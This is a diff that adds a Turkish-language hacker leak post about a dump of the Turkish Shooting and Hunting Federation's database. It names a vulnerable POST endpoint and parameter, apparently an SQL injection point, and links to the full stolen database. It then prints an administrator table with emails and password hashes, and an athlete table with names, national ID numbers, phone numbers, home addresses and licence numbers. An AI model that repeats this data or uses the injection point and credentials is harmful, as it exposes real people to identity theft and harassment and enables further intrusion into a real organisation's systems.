@@ -1,0 +1,43 @@
+Türkiye Atıcılık ve Avcılık Federasyonu Tarafımca Dumplanmıştır!
+
+VULN POST : https://www.taf.gov.tr/content/plugin/etaf/coaches/search.php   DATA : coach_name=1
+
+FULL DB: https://anonfiles.com/H9z48d50z1/tafgov_taf_new_rar
+
+Admin Bilgileri
+Database: tafgov_taf_new
+Table: administrator
+[7 entries]
++----+-----------------+----------+-------------+-----------+--------------------------+----------------------------------+---------------------+
+| id | name            | active   | surname     | user_name | email                    | password                         | last_login_date     |
++----+-----------------+----------+-------------+-----------+--------------------------+----------------------------------+---------------------+
+| 1  | Ana             | 1        | Kullanici   | admin     | etoprak06@gmail.com      | c7eb3950465d1c24aa844d6f1aefde1b | 2023-07-28 16:49:52 |
+| 2  | Sefa            | 1        | Sungur      | sefa      | sefasungur@gmail.com     | c7eb3950465d1c24aa844d6f1aefde1b | 2023-03-14 18:53:41 |
+| 5  | Şeyma Nur       | 1        | Öztürk      | Şeyma     | seyma@taf.gov.tr         | c7eb3950465d1c24aa844d6f1aefde1b | 2023-07-28 12:28:41 |
+| 6  | Burcu           | 1        | Soysal      | burcu     | burcuspor@gmail.com      | c7eb3950465d1c24aa844d6f1aefde1b | 2023-04-05 12:36:08 |
+| 8  | ETS             | 1        | Kullanıcısı | ets       | sefasungur@gmail.com     | c7eb3950465d1c24aa844d6f1aefde1b | 2020-03-06 10:26:19 |
+| 12 | ferda           | 1        | kabakuş     | Ferda     | nuri@taf.gov.tr          | c7eb3950465d1c24aa844d6f1aefde1b | 2023-07-20 09:55:40 |
+| 13 | Hüseyin Cevahir | 1        | Aydın       | Cevahir   | cevahir.aydin@taf.gov.tr | c7eb3950465d1c24aa844d6f1aefde1b | 2022-05-09 11:24:24 |
++----+-----------------+----------+-------------+-----------+--------------------------+----------------------------------+---------------------+
+
+Sporcu Bilgileri
+Database: tafgov_taf_new
+Table: sporter
+[13 entries]
++----+--------------+-------------+------------+----------------------------+----------------------------+---------------------------------------------------------------------+------+-----------+----------------+--------------+------------------+-------------+
+| id | name         | tc_number   | surname    | email                      | phone                      | address                                                             | city | education | licence_number | licence_date | sport_start_date | sporter_id  |
++----+--------------+-------------+------------+----------------------------+----------------------------+---------------------------------------------------------------------+------+-----------+----------------+--------------+------------------+-------------+
+| 13 | Nilay        | 21353135294 | AK         | nilayak33@gmail.com        | 0507 1895733               | Antalya Polis Spor Gücü Kulübü                                      | 07   | lisans    | 07-21353135294 | 2010-01-01   | 1970-01-01       | 01199200013 |
+| 14 | Nilsu        | 40726374474 | AK         | halilak33@hotmail.com      | 0505 2581313               | Antalya Polis Spor Gücü                                             | 07   | orta      | 07-40726374474 | 2013-01-01   | 1970-01-01       | 01200300014 |
+| 15 | Şeymanur     | 52525719950 | AYDOĞAN    | camakoergun@hotmail.com    | 0507 6547220               | Toplum Destekli Polis Loj. 4/10 Yenişehir/Mersin                    | 33   | lise      | 33-52525719950 | 2012-01-01   | 2011-01-01       | 01199700015 |
+| 17 | Mehmet Cevat | 39475983716 | CANCA      | mccanca@hotmail.com        | 0505 2164953               | Balıkesir Emniyet Müdürlüğü Olay Yeri İnceleme Şb.Müdürlüğü         | 10   | lisans    | 10-001000      | 2015-01-01   | 2008-01-01       | 01196900017 |
+| 18 | Özgür        | 44299656814 | ERDUĞAN    | deneme@taf.gov.tr          | 0505 5407728               | Balıkesir Emniyet Müdürlüğü                                         | 10   | lisans    | 10-001000272   | 2015-01-01   | 2000-01-01       | 01196500018 |
+| 19 | Osman        | 32704184212 | REYHANOĞLU | osmanreyhan62@hotmail.com  | 0505 4858959               | Balıkesir Polis Meslek Yüksekokulu                                  | 10   | lisans    | 10-001000442   | 2015-01-01   | 2000-01-01       | 01196200019 |
+| 20 | Eray         | 25231126732 | YÜCEER     | eryyuceer@gmail.com        | 0545 4584417               | Şeyhsinan mh. Emek sk. no:6/8 Elif apt. d:12 Çorlu/Tekirdağ         | 59   | lise      | 59-001000646   | 2015-01-01   | 2015-01-01       | 02198900020 |
+| 21 | Ömer Faruk   | 67120246626 | ERGÜN      | omerfarukergun42@gmail.com | 0544 877055 - 0545 8425570 | Bahçelievler mh. Şair Nefi sk. no:22 Mine apt. k:1/1 İlkadım/Samsun | 55   | lisans    | 55-001000278   | 2015-01-01   | 2015-01-01       | 02195500021 |
+| 22 | Atilla       | 10631418150 | ZEKERİYA   | zatillaonay@hotmail.com    | 0505 2529368               | Karahüyük mh. Hatıp c. no:227 Meram-Konya                           | 42   | lisans    | 42-01002403    | 2015-01-01   | 1987-01-01       | 02196900022 |
+| 24 | YÜKSEL       | 20915616684 | CAYVARLI   | yukselcayvarli@hotmail.com | 0 542 646 10 17            | SARIÇALI MAH. KAVAKLIDERE SOK. NO:10 ÇARŞAMBA SAMSUN                | 55   | lise      | 55-01-000168   | 2017-02-28   | 2010-04-14       | 02199300024 |
+| 27 | Nilay        | 21353135294 | ak         | burcusoysal@hotmail.com    | <blank>                    | <blank>                                                             | 01   | okur      | 07-01-00262    | 2016-10-13   | 1970-01-01       | 04197700027 |
+| 28 | YEŞİM        | 18137610580 | ABUKAN     | eroli1969@hotmail.com      | 05422930173                | <blank>                                                             | 47   | okur      | 47-01-003090   | 2016-03-10   | 2016-03-10       | 01199900028 |
+| 29 | CİHAN        | 20573516098 | TUNÇ       | cihantunc9@gmail.com       | 05395901027                | <blank>                                                             | 33   | okur      | 33-01-000284   | 2014-04-18   | 2014-04-18       | 01198500029 |
++----+--------------+-------------+------------+----------------------------+----------------------------+---------------------------------------------------------------------+------+-----------+----------------+--------------+------------------+-------------+
